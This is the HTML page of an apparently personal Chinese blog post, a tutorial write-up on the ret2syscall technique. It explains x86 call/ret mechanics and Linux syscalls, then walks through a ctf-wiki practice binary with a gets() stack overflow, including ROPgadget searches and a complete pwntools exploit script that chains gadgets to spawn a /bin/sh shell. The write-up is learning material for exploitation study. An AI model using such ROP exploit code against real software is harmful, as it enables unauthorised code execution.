@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ret2syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识： 1、x86下 ip 调用指令的过程：   从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； ip += 所读指令的长度，从而指向下一条指令； 执行指令，然后返回第一步   2、入栈 push 操作的本质：（pop就是反过来）  1、esp 寄">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2syscall">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="ret2syscall大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结 先附上有点模糊了的知识： 1、x86下 ip 调用指令的过程：   从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器； ip += 所读指令的长度，从而指向下一条指令； 执行指令，然后返回第一步   2、入栈 push 操作的本质：（pop就是反过来）  1、esp 寄">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;ret2syscall-1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall-4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;shell.png">
+<meta property="og:updated_time" content="2019-12-06T14:29:04.631Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;12&#x2F;06&#x2F;ret2syscall&#x2F;syscall.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/"/>
+
+
+
+
+
+  <title>ret2syscall | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2019/12/06/ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ret2syscall</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-06T16:23:27+08:00">
+                2019-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p>
+<p>先附上有点模糊了的知识：</p>
+<p>1、x86下 ip 调用指令的过程：</p>
+<blockquote>
+<ol>
+<li>从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</li>
+<li>ip += 所读指令的长度，从而指向下一条指令；</li>
+<li>执行指令，然后返回第一步</li>
+</ol>
+</blockquote>
+<p>2、入栈 push 操作的本质：（pop就是反过来）</p>
+<blockquote>
+<p>1、esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p>
+<p>2、将数据传入这个新的栈顶单元</p>
+</blockquote>
+<p>3、call 和 ret 的原理</p>
+<blockquote>
+<p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p>
+<p>2、ret ：pop ip （栈顶出栈会ip，让ip继续执行之前指令后面的指令） </p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p>
+<p>贴上wiki上面关于syscall的解释：</p>
+<blockquote>
+<p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p>
+<p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p>
+</blockquote>
+<p><img src="/2019/12/06/ret2syscall/syscall.png" alt></p>
+<p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p>
+<blockquote>
+<ol>
+<li>把系统调用的编号存入 EAX；</li>
+<li>把函数参数存入其它通用寄存器；</li>
+<li>触发 0x80 号中断（int 0x80）；</li>
+</ol>
+</blockquote>
+<p>同时附上操作系统实现系统调用的过程：</p>
+<blockquote>
+<ol>
+<li>应用程序调用库函数（API）；</li>
+<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
+<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
+<li>中断处理函数返回到 API 中；</li>
+<li>API 将 EAX 返回给应用程序。</li>
+</ol>
+</blockquote>
+<p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p>
+<table>
+<thead>
+<tr>
+<th>%eax</th>
+<th>系统调用名</th>
+<th>源代码</th>
+<th>%ebx</th>
+<th>%ecx</th>
+<th>%edx</th>
+<th>%esx</th>
+<th>通过堆栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>sys_exit</td>
+<td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>2</td>
+<td>sys_fork</td>
+<td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>3</td>
+<td>sys_read</td>
+<td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
+<td>unsigned int</td>
+<td>char *</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>4</td>
+<td>sys_write</td>
+<td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
+<td>unsigned int</td>
+<td>const char *</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sys_open</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>const char *</td>
+<td>int</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sys_close</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>unsigned int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>7</td>
+<td>sys_waitpid</td>
+<td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td>
+<td>pid_t</td>
+<td>unsigned int *</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>8</td>
+<td>sys_creat</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>const char *</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>9</td>
+<td>sys_link</td>
+<td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
+<td>const char *</td>
+<td>const char *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>10</td>
+<td>sys_unlink</td>
+<td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
+<td>const char *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>11</td>
+<td>sys_execve</td>
+<td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>12</td>
+<td>sys_chdir</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>const char *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>13</td>
+<td>sys_time</td>
+<td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td>
+<td>int *</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>14</td>
+<td>sys_mknod</td>
+<td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td>
+<td>const char *</td>
+<td>int</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>15</td>
+<td>sys_chmod</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>const char *</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>16</td>
+<td>sys_lchown</td>
+<td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td>
+<td>const char *</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>18</td>
+<td>sys_stat</td>
+<td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td>
+<td>char *</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>19</td>
+<td>sys_lseek</td>
+<td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td>
+<td>unsigned int</td>
+<td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td>
+<td>unsigned int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>20</td>
+<td>sys_getpid</td>
+<td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody></table>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p>
+<p>在这里我们决定构成下面这个系统调用： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p>
+<p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p>
+<p><img src="/2019/12/06/ret2syscall/ret2syscall-1.png" alt></p>
+<p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p>
+<p>然后我们继续寻找 ebx :</p>
+<p><img src="/2019/12/06/ret2syscall/syscall-2.png" alt></p>
+<p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p>
+<p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p>
+<p><img src="/2019/12/06/ret2syscall/syscall-3.png" alt></p>
+<p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p>
+<p><img src="/2019/12/06/ret2syscall/syscall-4.png" alt></p>
+<p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>下面用详细大白话解释exp：</p>
+<blockquote>
+<p>112个 a 控制溢出到返回地址，我们设置返回地址为 pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p>
+<p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p>
+<p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p>
+</blockquote>
+<p>至此 rop 链构建成功，成功getshell。</p>
+<p><img src="/2019/12/06/ret2syscall/shell.png" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含">
+                <i class="fa fa-chevron-left"></i> 文件包含
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">1.</span> <span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子"><span class="nav-number">1.2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
